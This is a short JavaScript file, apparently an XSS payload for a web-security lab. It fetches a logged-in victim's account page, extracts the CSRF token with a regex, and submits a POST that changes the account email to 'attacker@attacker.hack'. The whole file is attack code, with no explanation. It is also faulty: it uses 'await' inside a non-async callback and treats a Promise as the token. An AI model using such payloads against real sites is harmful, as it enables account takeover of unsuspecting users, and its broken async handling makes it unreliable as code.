function parseText(text){
    const re = new RegExp(/value="([A-Z,a-z,0-9]+)"/);
    const csrfArray = re.exec(text);
    csrf = csrfArray[1];
    console.log(csrf);
    return csrf
}


function changeEmail(){

    // VARIABLES DECLARATION
    var domain = document.domain;
    var domain_url = 'https://'+domain;
    var changeEmail_url = domain_url + '/my-account/change-email';
    var myAccount_url = domain_url + '/my-account';
    //var csrf;

    // OUTPUT AS READABLE STREAM OF TEXT
    async function grabText(){
        fetch(myAccount_url)
        .then((response) => {parseText(await response.text())})
        //.then(data => {return data});
    };
    //.then(data => {responseText = data})
    //.then(() => {csrf = parseText(responseText);});

    csrf = grabText();

    console.log('in changeEmail ' + csrf)
    // CREATE VARIABLES TO SEND ALONG THE REQUEST TO CHANGE EMAIL
    var params = {
        'email' : 'attacker@attacker.hack',
        'csrf' : csrf
    };

    var formBody = [];
    // URL ENCODING
    for (property in params) {
        var encodedKey = encodeURIComponent(property);
        var encodedValue = encodeURIComponent(params[property]);
        formBody.push(encodedKey + "=" + encodedValue)
    };
    formBody = formBody.join("&");

    fetch(changeEmail_url, {
        method : 'POST',
        headers : {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body : formBody
    });
}

